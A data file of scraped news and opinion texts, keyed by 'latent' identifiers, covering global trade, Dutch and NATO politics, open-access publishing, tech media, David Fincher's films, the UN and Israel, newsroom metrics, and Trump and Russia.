  "latent_19445": "U.S. financial markets have staged a stunning rally since Donald Trump’s surprise election victory. However, some observers remain wary of Trump’s promised trade protectionism and its long-term impact. Many fear a return to the disastrous, protectionist, nationalist U.S. policies of the 1930s.\n\nAs we transition into a digital age, the free flow of goods, services, technology, capital, education and innovation remains vital to our prosperity. A quick look at the numbers highlights a powerful, alternative narrative to the emotional and popular anti-globalization messages currently being proclaimed in developed economies. These facts need to inform the next generation of financial, political and business leaders on the world stage. Here are four major ways that global commerce benefits us all.\n\n1. There is a direct correlation between growth and trade.\n\nGDP growth rises with the volume of global exports. The production and trading of physical assets, such as agriculture and commodities, combined with faster transaction times and processes fueled by globalization, resulted in extraordinary global economic expansion during the 1990s.\n\nEven as that flow of physical assets has slowed, countries in Southeast Asia are still growing rapidly. Young populations in the region are benefitting from higher incomes due to exports. And those increased wages boost demand for goods from “new economy” sectors, such as health care, services and technology, much of which originates in the U.S. and Europe. Chinese demand for American blockbuster movies is just one example of “old economy” jobs (such as in manufacturing) in developing economies fueling “new economy” jobs (such as in digital media) in advanced economies.\n\nAl This chart shows the growth of world merchandise exports and GDP from 1980 to 2014.\n\n2. Global commerce provides diverse sources of funding and enables international public-private partnerships.\n\nBeyond the free flow of physical assets, a look at foreign direct investment and cross-border mergers and acquisitions reveals a very different storyline from the protectionist message. Last year, 1.89 million jobs were created globally by greenfield foreign direct investment (that is, investing in a foreign country in a project or operations from the ground up).\n\nIn Arkansas, a Chinese manufacturer is creating jobs by building factories in the retail and consumer space. In Ohio, a Chinese billionaire is reviving a closed auto plant to create 3,000 jobs. In Egypt, the European Bank for Reconstruction and Development recently announced it will work with a local bank to fund small and medium enterprises to tackle energy efficiency. As these examples show, goods produced in one country meet the demand of workers in another, and capital to fund business growth often comes from diverse sources from around the globe.\n\nThese creative cross-border structures are essential to solving some of the world’s complex problems. As Trump’s advisors put forward their infrastructure plan, we should remember that no man and no infrastructure plan is an island in a globalized world. Successful large-scale projects often rely on varied funding sources and global strategic partnerships around the world. The Panama Canal, funded and created by the Panama Canal Authority and a consortium of international banks, is a case in point. Moreover, diversified capital sources can beneficially spread risk across investors.\n\nIncreased wages in Southeast Asia boost demand for goods from new economy sectors in the West.\n\n3. Nowhere are cross-border bridges more important than in education.\n\nIn the U.S. and Great Britain, higher tuitions paid by foreign students have helped counterbalance decreased public funding. And America has much to learn from other countries, including France, Germany and Mexico, about vocational training. Perhaps knowledge from well-regarded foreign programs can be adapted and piloted in Pennsylvania, where old-economy steelworkers need to be transitioned into new-economy jobs, such as IT and data analytics. Looking farther ahead, U.S. vocational expertise could then be exported to China, as the Chinese government seeks to upgrade its manufacturing capacity through digitization.\n\n4. Supporting innovation and incubating ideas across borders has a multiplier effect.\n\nAs our economies shift from computers to digitization and the internet of things and onward to whatever comes next, free exchange will be central to growth ― globally, regionally, nationally, provincially, municipally and at the community level. A Chinese company is currently making significant inroads in developing 5G mobile technology, and its advancements will ultimately benefit Western counterparts. This kind of cross-pollination benefits us all.\n\nThe private sector has a role to play in solving global problems ― whether it is in the form of a publicly owned corporation, a family office, an institutional investor or a start-up company with a vision and a purpose. These structures may take on the character of specific advocacy ― such as for the environment. The deepening preference of millennials for social-impact investing and sustainable development goals is a case in point. But the private sector can’t go it alone ― governments and public-private partnerships form part of the mix. Mutual collaboration to solve common problems ― incentivized by a rate of return ― is not a bad thing.\n\nIn Ohio, a Chinese billionaire is reviving a closed auto plant to create 3,000 jobs.\n\nGlobal commerce does not have to mean rampant capitalism or unfettered financial markets. Instead, our debate should focus on the singular role that the private sector can play in advancing the needs of humanity within and across communities and in enabling individuals to directly contribute to generating income, value and growth.",
  "latent_19558": "THE HAGUE (AFP) – Geert Wilders may have been beaten into second place in the Dutch elections but the far-right MP will enjoy a magnified role in parliament and remain a force to be reckoned with, analysts said.\n\nWhile he failed in his aim of starting a “patriotic revolution,” Wilders has already succeeded in shifting the debate and the tone in Dutch politics on immigration and integration, observers said.\n\nCampaigning on an anti-Islam ticket, the peroxide-haired politician saw his hopes wilt from an all-time high in January when opinion polls had said he could win as many as 37 seats in the 150-seat Dutch lower chamber.\n\nInstead, he captured a more sobering 20 seats in Wednesday’s general elections, behind the 33 won by the Liberal party of Prime Minister Mark Rutte, but enough to place his Freedom Party (PVV) second.\n\n“It would have been great if we were the largest, but we’re willing to talk and help govern. That’s my hope,” Wilders told journalists Thursday.\n\nBut he warned his party would “show our hard opposition side” if he were excluded.\n\nThe long process to form the next government has begun with the VVD sounding out other parties to try to cobble together a coalition.\n\nMost parties leaders, including Rutte, have already vowed not to work with Wilders, alienated by his fiery anti-immigrant, anti-EU rhetoric, and his go-it-alone attitude.\n\n– Long shadow –\n\nBut analysts say Wilders, who quit the VVD in 2006 to set up his party, will continue to cast a long shadow across the Dutch political landscape and has already succeeded in pulling the lowlands country to the right.\n\n“What’s telling is that many parties, including Rutte’s VVD, have already taken on some of the PVV’s viewpoints and content… particularly when it comes to immigration policies,” said Matthijs Rooduijn, a political sociologist at Utrecht University.\n\n“That doesn’t mean that parties like the VVD… suddenly moved to the far-right, but there certainly is a shift in that direction,” he said.\n\n“Most parties have become more nationalist and that’s because of the PVV’s influence,” he said.\n\nWith Wilders likely to end up the largest party in opposition, more clashes are also forecast, such as with rising young green-left star Jesse Klaver, whose GroenLinks party upped their seats from four to 14.\n\nWilders will also likely lock horns with the progressive leader of Democracy party D66, Alexander Pechtold, which the PVV beat into third place with 19 seats.\n\nShould D66 or GroenLinks enter government with Rutte “the clash is going to continue when it comes to social and cultural topics. And the sparks are going to fly,” Rooduijn said.\n\n– ‘Bland political elites’ –\n\nWilders, who already triggered the collapse of one Rutte government in 2012, could also seek to exploit the fragmented nature of the next coalition which will be made up of at least four and maybe five parties, Rooduijn said.\n\n“He could argue the new cabinet is making too many compromises and back-room deals — it will give him extra ammunition for his populist message that there’s a bland political elite who still won’t listen to voters’ concerns,” he said.\n\n“The outcome of this election does not at all mean the end of Geert Wilders and the issues that he is advocating,” said Claes de Vreese, politics professor at the University of Amsterdam.\n\n“He remains an important force in Dutch and European politics. He had more votes and increased his number of seats, even though it was not this ‘people’s revolution’ that he was claiming.”\n\nWilders was hailed by European far-right leaders too, ahead of other key elections in France and Germany this year, who said his polls performance was far from a defeat.\n\nHis success “proves that the ideas we share are advancing in the various European countries,” said Marine Le Pen, leader of France’s National Front, who is hoping to upset the French presidential elections.\n\n“Ignore the froth: whilst the establishment did cling on, they took a beating at this election,” wrote the new anti-establishment British blog Westmonster.\n\nWilders’s notoriety has already spread across the Atlantic.\n\nTrevor Noah, who hosts the popular US late night programme “The Daily Show”, gave Wilders and his “hateful” message a roasting Thursday, comparing his blond mesh to Donald Trump, and likening him to a blond villan played by the actor Christopher Walken’s in “Batman Returns.”",

  "latent_20000": "CHICAGO, IL (March 1, 2017) - Scholastica, a peer review and open access (OA) publishing platform for academic journals, announces \"Democratizing Academic Journals: Technology, Services, and Open Access,\" a new white paper on the state of academic journal publishing. The paper proposes an upending of the corporate publisher paradigm to make OA journal publishing sustainable.\n\nThe white paper argues that the best solution to make research OA is democratization of journal publishing via widespread adoption of publishing services that will foster competition in the marketplace and allow journals of all sizes to publish on their own.\n\nSince the 1960s corporate publishers have been infiltrating academic journal publishing. Today, five corporate publishers control the majority market share of academic journals, with profit margins from journal subscriptions and OA publishing fees exceeding 30%.\n\nFor years, the academic community has been trying to work with publishers to make journals more affordable. However, both camps have opposing incentives - academia seeks to lower journal production costs and access barriers while corporate publishers seek profit.\n\nThe centralization of journals among fewer hands has created substantial power differentials between academic institutions and corporate publishers. Consequently, corporate publisher motivations have prevailed resulting in a virtually irreversible stalemate in negotiations to lower journal prices.\n\nScholastica's white paper brings together research on the state of journal publishing and insights from 5 expert OA advocates to assess the past and present journal publishing landscape and pinpoint ways to make OA publishing sustainable.\n\nThe white paper overviews:\n\nThe past and present state of journal publishing\n\nCurrent alternatives to the corporate publisher model\n\nSteps to realize a sustainable open-access friendly journals model of the future\n\nThe paper argues by moving journal publishing back to the nonprofit sector and publishing digital-only using online services, rather than outsourcing to publishing companies, the academic community will regain control of research production costs and access.\n\nScholastica hopes this white paper will offer context surrounding the journals crisis as well as a fresh perspective on how to rectify it.\n\n\"This paper really gets to the core of why we started Scholastica 5 years ago. Our goal is to build modern and affordable journal management software that lowers the barriers to entry to run a journal,\" said Co-Founder Brian Cody. \"We provide the tools and journals decide their publishing and funding models without needing to outsource publishing to a middleman.\"\n\n###\n\nScholastica gratefully acknowledges the following white paper contributors:\n\nBjörn Brembs, Professor of Neurogenetics at the University of Regensburg and OA advocate\n\nDan Morgan, Digital Science Publisher at University of California Press\n\nRoxanne Missingham, Chief Scholarly Information Officer at Australian National University and Australian OA Support Group Deputy Chair\n\nStevan Harnad, Professor in the Department of Psychology at Université du Québec à Montréal, Professor of Web Science at University of Southampton, Green OA advocate\n\nUlrich Herb, OA expert at Saarland University and State Library and member of multiple OA working groups\n\nAbout Scholastica: Scholastica is a web-based software platform for managing academic journals with integrated peer review and open access publishing tools.

  "latent_20153": "Welcome to the world of Internet tech coverage. The big, stupid, stinky onion that is the world of Internet tech coverage.\n\nThe outside layer of this onion is benign. In this case, it’s an interview by the Telegraph with former Motorola CEO Dennis Woodside, who conducted Google’s $12.5 billion purchase of the company. [Correction: an earlier version of this story called Woodside the \"architect\" but that is not correct. Andy Rubin seems to have arranged the deal from Google's side while Woodside carried it out for the company.] This is the plain brown wrapper in which we will find the eye-watering mess that is the heart of Internet tech coverage.\n\nThis piece was picked up by Engadget, which extracts this from the interview:\n\n”The Nexus 6 nearly had a fingerprint sensor in its dimple”\n\nMotorola's Nexus 6 almost had a fingerprint sensor, but Apple spoiled the idea.\n\nAh! Apple in the lede. Now we’re getting somewhere. We’re into the white part of the onion, but it hasn’t really started to smell yet. Let’s see who can really stink this up. Oh, it’s Gizmodo, which read Engadget’s piece about the Telegraph piece and came up with this:\n\n“Your Nexus 6’s Lack of Fingerprint Sensor Is Apple’s Fault” (tip o’ the antlers to @mylestaylor)\n\nNow we’re cooking with gas. Stupid, stinky gas. Well, of course it’s Apple’s fault. Do you even have to ask? Heck, the reason daddy drinks so much is Apple’s fault, too. So’s the reason mommy left and Christmas never came again and, well, why bad things happen to good people, basically.\n\nThe Nexus 6 is incredibly large and also amazingly good.\n\nIt even comes with an easy-to-remove back for your convenience!\n\nBut as your fingers slide around that monstrous screen, there’s one thing that’s missing...\n\nAn identifiable sense of style?\n\n...finger print recognition.\n\nOh. Well, let’s just say two things.\n\nAnd that, apparently, is Apple’s fault.\n\nFrom zero to dumb in 3.0 sentences.\n\nIn an interview with The Telegraph, former Motorola CEO and current Dropbox leader Dennis Woodside explains that the fingerprint technology that Motorola had been leaning on was robbed away from it by Apple.\n\n“Robbed.” Not Woodside’s words, of course, and with good reason.\n\nIn 2011, he says, Moto was pioneering fingerprint recognition by working with a company called Authentec. But then in 2012, it was bought by Apple to fuel Touch ID for a cool $356 million.\n\nYou know, the kind of robbery where you pay $356 million for something. That kind of robbery.\n\nIt was almost certainly the right idea to leave out crappy finger print recognition—which can be maddening in use—but it’s a shame for Google and Moto that it got the carpet tugged from under it by Cook & Co..\n\nSo inconsiderate! Apple, of course, is roundly chastised for not making the big deals like Woodside did in bringing about Google’s acquisition of Motorola. Now it has to suffer the barbs of Gizmodo, laced with weapons-grade dumb, for making a smart acquisition that enhanced its products and crippled those of its competitors.\n\nHere’s a thought: Maybe if guys like Woodside did their jobs better and orchestrated deals that improved the company’s value instead of ones that act as vanity splashes for themselves to get plush CEO gigs, there’d be less room to blame Apple. Maybe that’s the story.\n\nHaha. Just kidding.",
  "latent_20202": "Never before, in its 65-year history, has the North Atlantic Treaty Organization faced a threat so close to the one that provoked its initial creation: The prospect of Moscow marching westward into Europe.\n\nAnd never before have we been made so acutely aware of the alliance's irrelevance to the modern version of that threat.\n\nIn the days immediately before this week's NATO summit in Wales, the fields of eastern Ukraine witnessed a spectre not seen since the alliance was created in 1949: Masses of heavily armed pro-Russian irregulars, and what impartial witnesses say were regular Russian troops, shelling and bombarding their way into what one seasoned reporter called a \"catastrophic defeat\" of the Ukrainian military, leading to humiliating ceasefire terms that resemble nothing more than a Russian occupation of previously sovereign territory.\n\nStory continues below advertisement\n\nOn one hand, this military insult was an event that returned NATO to something resembling its original purpose after decades bogged down in the Balkans, in Afghanistan and in North Africa. Some of the alliance's more gung-ho leaders tried to portray this incursion as giving NATO a new sense of purpose: \"'Do we need NATO?' was a real debate for a number of years. Putin has ended that debate,\" Malcolm Rifkind, the chairman of Britain's parliamentary defence committee, said on Wednesday. \"We have experienced for the first time since 1945 the annexation of one part of a European country by another by military means.\"\n\nBut, at the same time, it was an event that showed the world how painfully ill-suited this 1940s military alliance is to responding to the very non-traditional military threats facing eastern Europe and the Middle East.\n\nThe set of announcements released at the conference's conclusion on Friday were intended to show resolve and unity in the face of an international image of a declining, fragmented Western military. But in many ways they revealed a deeper weakness in the basic organization of NATO and a more profound schism among its members.\n\nThe two key planks are the announcement of a rapid-response force and a \"readiness action plan\" designed to respond to threats with decisive force within \"2 to 5 days,\" and a more or less permanent positioning of NATO troops and weapons in the alliance's Eastern European member states as a supposed firewall against Russia.\n\nThe rapid-response force, while something that NATO has been working on and discussing for years, represents nothing either decisive or new. It will take years to organize and implement. And rapid response capability is not something that is currently lacking: As the very quick NATO-organized air-support operation to back Libya's rebels in 2011 showed, there is no lack of quick-response capability in the alliance's military forces.\n\nShould Vladimir Putin's military incursion into Ukraine require a Western military response – a genuine future possibility, but one that would be attempted only after a range of more effective and realistic responses have been played out – there is nothing preventing rapid and crippling air strikes beyond the quite reasonable fear of unleashing a larger war.\n\nIf quick response is unnecessary, NATO's other big gesture, the establishment of more or less permanent \"forward operating bases\" and supply hubs across the alliance's eastern flank, is purely symbolic.\n\nStory continues below advertisement\n\nStory continues below advertisement\n\nThat gesture speaks to the basic dissonance within NATO's current membership. The organization has, for the past decade, been divided into three very different world views.\n\nThe first is that of the United States (and its English-speaking allies), which is capable of meeting any military challenge unilaterally, but which has long relied on the alliance to provide broader international consensus around military responses.\n\nThe second are the countries of continental Europe, many of which have large but ineffective militaries designed for ground wars and ill-suited to modern threats; they're also dependent on Russian gas and have been reluctant to back heavy sanctions and military postures.\n\nAnd the third are the eastern European states – seven former Warsaw Pact countries that were added to NATO's membership in 2004. This added another world-view to the alliance: Many of these countries' leaders view Russia through an old-school Cold War lens: That is, they see the threat being one of thousands of tanks charging across the steppe in a ground-war retaking of territory; therefore, they see the best defence as being an equally old-school permanent basing of missiles and troops along the Russian frontier.\n\nThis view, and the demand for Cold War-era bases, has long infuriated military leaders in London, Washington and some Western European capitals and created tension at previous NATO summits. But Mr. Putin's aggression has now created a political counterweight in the East that has forced them to give into this demand.\n\nThe problem is that Mr. Putin's approach is is not to engage in a Cold War-style land invasion (though it certainly looked like one in Donetsk last week); rather, it is to stir up rebellion, ambiguity and humanitarian crises in regions he believes can be manipulated; it appears that his end game is not to establish a new Soviet-style empire but rather to destabilize the potentially pro-European countries around the Russian border.\n\nStory continues below advertisement\n\nThat may change – and if it did, there would be no shortage of Western military response, with or without permanent \"forward operating bases\" – but the consensus within NATO countries is that Mr. Putin poses a distinctly 21st-century, unconventional threat. It is not a simple matter of dropping bombs on Moscow, or lining missiles along the Russian border.\n\nThe member countries of NATO are perfectly capable of meeting that threat, whatever form it eventually takes, with economic, diplomatic and military tools. The problem is that NATO itself is still organized around a form of threat that no longer exists, and its effort to \"show resolve\" has only made that basic anachronism all the more visible.",

  "latent_20552": "Some people go to the movies to be reminded that everything’s okay. I don’t make those kinds of movies. – David Fincher\n\nRemove predictability and everything that remains is a thriller. A typical thriller is laced with a high degree of intrigue, adventure, suspense and keeps the viewer on the edge of his seat. The best minds in this business understand the human psychology and are successful in engaging the audience in the best way till the end. However, there’s only a handful of people that have made their mark in this genre over the years.\n\nAlfred Hitchcock, Roman Polanski, David Lynch are a few names associated with the genre. They have directed some of the best thrillers in the history of cinema. Another director has made this genre his own with trademark visual style and camera work – David Fincher. He’s donned the director’s hat in some remarkable and breakthrough thrillers of all time like Se7en, Zodiac, The Girl With the Dragon Tattoo, Gone Girl etc.\n\nThe Origin\n\nDavid Fincher’s introduction with cinema began fairly early. Fincher and his family moved next door to George Lucas in California in 1964. Quite a few years before Lucas would go on to create a historical Star Wars Universe. Fincher began film-making at the age of 8. A young David Fincher co-founded Propaganda Films and honed his trade by directing music videos and commercial for some of the biggest names back then including Madonna and the Rolling Stones. Propaganda Films, coincidentally, churned out some of the biggest Hollywood directors including Michael Bay, Spike Jonze and Zack Snyder.\n\nFincher’s foray into directing Hollywood biggies started with a dismal commercial and critical failure 25 years ago in Alien 3 (1992). Fincher maintains his first movie Alien 3 was not really the product of his vision due to the constant meddling of studio executives (20th Century Fox). “No one hated it more than me; to this day, no one hates it more than me.” Fincher retracted with Se7en (1995) which gave us the first big screen glimpse of Fincher’s fascination with the darkness of human emotions (Gone Girl). He later directed the screen adaptation of Chuck Palahniuk’s novel Fight Club (1999). Although the movie failed to draw big at the box office at that time, it received critical acclaim and cult status when critics reassessed the movie.\n\nMark Salisbury: David Fincher, let’s start at the end, as Button does, and talk about The Curious Case of Benjamin Button. It’s kind of a departure for you, in that it’s a love story, but with an unhappy ending. David Fincher: Yes, everybody dies.\n\nDecoding the Key Elements of Fincher’s Style\n\nThe Characters and The Cast\n\nQuite a few of Fincher’s thrillers are based on the premise of an investigation. They are either detectives (Se7en, Zodiac) or take on the role of investigators during the course of the story (Gone Girl, The Girl With the Dragon Tattoo). These characters act as the cornerstone of the script around which the whole of the movie revolves. In such movies, Fincher places additional attention to detail in even in background elements of a setting in order to incorporate the nature of his character’s job.\n\nEach of Fincher’s movie had the cast and the character complimenting each other. Brad Pitt has been the most frequent collaborator with Fincher having being cast in Se7en, Fight Club and The Curious Case of Benjamin Button. Among other characters played to perfection include Morgan Freeman, Ed Norton, Michael Douglas and the entire cast of Zodiac (2005).\n\nSource\n\nThe Visual Language – Visual Effects and Cinematography\n\nAs noted by kaptainkristian, David Fincher’s style of filmmaking has a heavy utilization of CGI and visual effects. A part of David Fincher’s craft lies in his ability to imagine the possibilities CGI and visual effect studios unfold. He integrates impossible camera angles and transitions (Fight Club opening sequence) into his storytelling which adds to the impact. He has decades of experience in the field, having worked as a Visual Effects producer since his early days in filmmaking. In 1984, he directed a commercial for American Cancer Society that depicted a fetus smoking a cigarette. His experience with visual effects made him a better judge of how and when to use an effect effectively.\n\nFincher prefers using CGI in sequences that can be easily shot in a different way, albeit with a few shortcomings. For Fincher, that is not an option. Zodiac uses visual effects to portray the setting of the movie – mid-1960s San Francisco. He used effects to digitally make San Francisco as authentic as possible. David Fincher also uses digital blood in post processing as often as he can.\n\nDavid Fincher also hates hand-held camera shots for the most part. According to him, the camera does not have any personality and hence the movie must not include camera shake unless absolutely essential. The Girl With the Dragon Tattoo has two hand-held shots, Zodiac has just one. Se7en has the most hand-held shots in Fincher’s filmography with five.\n\nFilmmaking and Screenplay\n\nFincher has a unique way with the viewers. His style of filmmaking in engulfing and once the movie starts, the intrigue and suspense keeps them on the edge of their seats as each craftily created sequence unfolds.\n\nSource\n\nDirecting a thriller is not an easy task. One minor inconsistency in and whole plot and suspense crumbles. Fincher, however, keeps his viewers guessing, showing just enough to give them a scent of clue each passing minute. His unique style of experimenting with the styles of cinematography makes him one of the most sought after director today. Mindhunter, Fincher’s Executive Production makes way to Netflix in October. The trailer looks promising, with a few glimpses of Fincher’s trademark camera work and his taste for suspense. Among other things is World War Z Sequel, Fincher’s next project, the dates for which are yet to be announced. We hope with it returns the vintage David Fincher.\n\nFeatured Image Source",

  "latent_20590": "According to the United Nations, the most evil country in the world today is Israel.\n\nOn March 24, 2016, the U.N. Commission on the Status of Women (CSW) wrapped up its annual meeting in New York by condemning only one country for violating women’s rights anywhere on the planet – Israel, for violating the rights of Palestinian women.\n\nOn the same day, the U.N. Human Rights Council concluded its month-long session in Geneva by condemning Israel five times more than any other of the 192 UN member states.\n\nThere were five Council resolutions on Israel. One each on the likes of hellish countries like Syria, North Korea and Iran. Libya got an offer of “technical assistance.” And countries like Russia, Saudi Arabia and China were among the 95 percent of states that were never mentioned.\n\nNo slander is deemed too vile for the U.N. human rights bodies that routinely listen to highly orchestrated Palestinian versions of the ancient blood libel against the Jews.\n\nIn Geneva, Palestinian representative Ibrahim Khraishi told the Council on March 24, 2016: “Israeli soldiers and settlers kill Palestinian children. They shoot them dead. They will leave them to bleed to death.” And in New York, Palestinian representative Haifa Al-Agha told CSW on March 16, 2016: “Israel…is directing its military machinery against women and girls. They are killing them, injuring them, and leaving them bleeding to death.”\n\nOperating hand-in-glove with governments and the U.N. secretariat are the unelected, sanctimonious NGOs, to which the UN offers free facilities and daily advertisement of “side-events.” In theory “materials containing abusive or offensive language or images are not permitted on United Nations premises.”\n\nIn practice, in Geneva the UN permitted handouts that claimed Israel “saw ethnic cleansing as a necessary precondition for its existence.” A film accused Israel of sexual violence against children and “trying to exterminate an entire Palestinian generation.” Speeches focused on the 1948 “catastrophe” in which a “settler colonial state” was established on Palestinian land.\n\nThe New York CSW-NGO scene included a film set in in the context of Israeli “oppression” and the “tear gas of my childhood,” and statements analogizing the experiences of Palestinians to today’s Syrian refugees.\n\nPicture these real-life scenes:\n\nIn Geneva’s grand U.N. “Human Rights” Council chamber, 750 people assembled, pounced on the Jewish state, broadcast the spectacle online, and produced hundreds of articles and interviews in dozens of languages championing the results.\n\nOn the ground, Israelis are being hacked to death on the streets, stabbed in buses, slaughtered in synagogues, mowed down with automobiles, and shot in front of their children.\n\nAt the New York’s UN headquarters, 8,100 NGO representatives gathered from all corners of the globe, in addition to government delegates, and watched the weight of the entire world of women’s rights descend on only one country.\n\nOn the ground, Palestinian women are murdered and subjugated for the sake of male honor, Saudi women can’t drive, Iranian women are stoned to death for so-called “adultery,” Egyptian women have their genitals mutilated and Sudanese women give birth in prison with their legs shackled for being Christian.\n\nIsn’t it about time that people stopped calling the U.N. a harmless international salon or a bad joke?\n\nThe poison isn’t simply rhetorical. One of the Council resolutions adopted last week launches a worldwide witch-hunt for companies that do business with Israel – as part of an effort to accomplish through economic strangulation what Israel’s enemies have not been able to accomplish on the battlefield. The resolution casts a wide net encompassing all companies engaged in whatever the U.N. thinks are business “practices that disadvantage Palestinian enterprises.”\n\nAnd the toxicity is self-perpetuating. Acting at the beck and call of Islamic states and their conduit – French Ambassador Elizabeth Laurin, Council President Choi Kyonglim selected Canadian law professor Michael Lynk as the newest U.N. “independent” human rights investigator on Israel.\n\nLynk’s qualifications? He has likened Israelis to Nazis, and challenged the legitimacy of the state of Israel starting in 1948 as rooted in “ethnic cleansing.”\n\nAll of this played out in the same week that Europe was reeling from the Belgian terror attacks. Petrified or already vanquished, no European state voted against this onslaught of U.N. resolutions against Israel. Germany and the United Kingdom occasionally abstained, while France voted with Arab and Islamic states on all but one Council resolution.\n\nHere we are just 70 years after World War II and Europeans believe that they can license this vitriol against the Jewish state – the only democracy on the front lines of an Islamist war against human decency – and the consequences can be contained to the Jews.\n\nEven as the converse stares them in the face. Two days after the Brussels attacks, Islamic states rammed through a Council resolution slyly labeled “Effects of terrorism on the enjoyment of all human rights” that was actually so anti-human rights even Belgium was forced to vote against it.\n\nAs for the United States, the Obama administration has been the Human Rights Council’s most important supporter. Though the U.S. is currently in a mandatory one-year hiatus -- after serving two consecutive terms -- President Obama plans to bind his successor by running again in the fall for another three-year term that starts January 1, 2017.\n\nMemo to Americans who are mad as hell: It's time to elicit a promise from our would-be leaders to refuse to sit on the U.N. Human Rights Council or to legitimize the United Nations.",
  "latent_20622": "Editors at The Journal, like those at other large newspapers, follow the Web traffic metrics closely.

Can we do a photo gallery? Can we do any kind of user-generated content?”\n\nPhoto\n\nHe said the data has proved highly useful in today’s world of shrinking newsroom budgets. Mr. Narisetti said that when he had to reduce his staff last year, he looked at what kind of content was not performing well with readers. He discovered that long-form video had a low audience, so he reduced that department by a couple of people.\n\nAdvertisement Continue reading the main story\n\nAt The Journal, editors use traffic data to inform decisions on how articles should be presented on WSJ.com. “We look at the data, and if things are getting a lot of hits, they’ll get better play and longer play on the home page,” said Mr. Murray. Conversely, articles getting low audiences will be moved down more quickly if there is no compelling news reason to keep them prominent.\n\nBut Mr. Murray explained that the data was not always used as a blunt tool. In the case of a rather dry business development last month involving the Potash Corporation , the Canadian fertilizer maker, Journal editors decided to prominently display articles on the subject despite very low traffic numbers.\n\nNewsletter Sign Up Continue reading the main story Please verify you're not a robot by clicking the box.

We put it there because it’s big important news in the business world,” Mr. Murray said.\n\nThe New York Times does not use Web metrics to determine how articles are presented, but it does use them to make strategic decisions about its online report, said Bill Keller , the executive editor. “We don’t let metrics dictate our assignments and play,” he said, “because we believe readers come to us for our judgment, not the judgment of the crowd. We’re not ‘ American Idol .’ ”\n\nMr. Keller added that the paper would, for example, use the data to determine which blogs to expand, eliminate or tweak.\n\nAs newspaper Web sites use technology to learn more about readers’ habits, they are also developing new ways to persuade readers to tell them more about what they want. The Los Angeles Times features what it calls a “personality quiz” for readers on its Web site. The feature adds a spin to the personalization options that Web sites have offered for the last few years with a 17-question test that asks readers things like “What does success mean to you?” and has them pick from 12 photos. A few options include images of a wedding, a gleaming sports car and a man embracing a peasant child.\n\nAt the end of the quiz, readers are assigned a personality type like “dynamo,” who, as the quiz explains, is someone “always seeking new adventures that broaden your horizons and take you out of your comfort zone.” A customized news feed then appears each time a reader visits the Web site from the same computer.\n\n“It helps me understand the readers in a way that I can’t with just the metrics,” said Sean Gallagher, managing editor for online operations at The Los Angeles Times, explaining that he now pairs sports articles with food articles because surveys have shown a correlation.\n\nAdvertisement Continue reading the main story\n\nAs the technology advances and allows papers to look more deeply at performance metrics, newsrooms may find that there is just some data they would rather not know.\n\nAt a recent meeting with the top online editors of The Los Angeles Times, a consulting group that helps media companies enhance profits from their Web sites pitched new software that it said could change the industry. The newsroom would be able to know how much money — down to the penny — each of its articles online was making when readers clicked on ads.\n\n“I could see a business case for it,” said Mr. Gallagher, who hastened to add, “I don’t agree with that business case.”\n\nSoftware developers acknowledge that the questions can be difficult as newspapers try to reinvent their business models. But they say the dialogue is ultimately constructive.\n\n“By having this data and making it available, we’re spurring the conversations to take place,” said Tim Ruder, chief revenue officer for Perfect Market, the company that developed the tracking software for ad clicks. “And it’s especially healthy to have those conversations in the context of experience and not in an abstract way.”",
  "latent_20673": "I don't think there's much doubt that President Donald Trump is a very lucky man. You don't fail up the way he has without a surfeit of good fortune (or without making a deal with the devil.) He inherited a fortune, and as much as he tried to lose it all he only ended up making more money. Now he's the president of the most powerful nation on Earth, and the first six weeks of his presidency have shown us that his good luck is holding. Trump is his own worst enemy, stepping on good press with tantrums and gaffes. His obvious unfitness and lack of preparation for the job becomes clearer every day. Somehow, something always intervenes to save him. We don't know what will happen with what Breitbart has dubbed \"DeepStateGate.\" The latest WikiLeaks publication — of secret CIA spying tools — is morphing into a Bizarro World scandal in which the question of the hacking of a presidential campaign and possible connections between the president's men and shadowy Russians is now about former President Barack Obama running a clandestine CIA \"false flag\" operation to pin the hacking on the Russians and implicate Trump.\n\nCongressional investigations will now perhaps include both the Russian hacking and possible Obama wiretapping, which is another lucky break for Trump. Republicans run those committees and will be happy to flog whatever storyline will help their president.\n\nThis raises the question of whether people should get their hopes up about the Russian scandal revealing something impeachable. Of course, there is enough evidence to investigate. A foreign government's interfering with a democratic country's election is a big problem. (And yes, I know the U.S. has done this as well. I think that's a big problem, too.)\n\nBut in my view investigators should devote as much time and energy as possible into following the money, since the conflicts of interest in Trump's business career are unknown and he refuses to be even slightly transparent about his financial dealings anywhere in the world, including Russia. In that regard, the Russian connection is compelling, independent of any collusion with the Putin government before the election.\n\nAdvertisement:\n\nFor instance, Trump has said repeatedly he has no business in Russia but his son Donald Jr. gave an interview in 2008 that has been quoted widely and understood to mean that the Trumps have a lot of business in Russia. He talked about how difficult the business practices are there and how you can never be sure if you're going to get your money back.\n\nThe quote that's made the rounds is this: \"Russians make up a pretty disproportionate cross-section of a lot of our assets.\"\n\nBut that's truncated. This is the whole quote:\n\nAnd in terms of high-end product influx into the US, Russians make up a pretty disproportionate cross-section of a lot of our assets; say, in Dubai, and certainly with our project in SoHo and anywhere in New York. We see a lot of money pouring in from Russia. There's indeed a lot of money coming for new-builds and resale reflecting a trend in the Russian economy and, of course, the weak dollar versus the ruble.\n\nIn other words, when he said that Russians make up a disproportionate cross section of their assets, he wasn't talking about assets in Russia; he was talking about Russians investing in Trump properties in the U.S.\n\nThere may no direct espionage or collusion with Vladimir Putin that is likely to lead to impeachment. But the issue of corruption and conflict of interest is ripe for investigation and the Russian connection may lead to Trump being forced to release more information about his holdings. Remember: Suspicious email server management was not the original purpose of the Benghazi investigation either. But it led to the FBI director's tilting the election toward Donald Trump. So you just never know what might happen.\n\nAnyway, it's really not necessary to believe that Trump is under Putin's thumb to be concerned about Trump's weird affection toward the Russian president. It seems strange for a man like Trump to be so dewy-eyed about an adversary, which is one of the main reasons that people are suspicious. But the fact is that Trump has long admired strongman leadership. His worship of the Gens. George Patton and Douglas MacArthur, his compliments to North Korea's Kim Jong Un for his ability despite his youth to \"take out his rivals,\" his kudos to the Chinese government for being \"strong\" in perpetrating the Tiananmen Square massacre, and even his alleged compliments to the murderous President Rodrigo Duterte in the Philippines are all examples of his admiration for authoritarian leaders. In the revised history of Trump's supposed opposition to the Iraq war, he claimed it was because Saddam was a tough guy who knew how to fight terrorists. Trump seems to have a similar respect for Syria's Bashar Assad, whom he called \"much tougher and much smarter\" than former President Barack Obama. But there's nobody over whom he's been more moonstruck than Putin. In a 2007 appearance on Larry King's CNN show Trump slammed George W. Bush hard, in contrast to the man he believed was showing great leadership: “Whether you like him or don’t like him,” Putin's doing “a 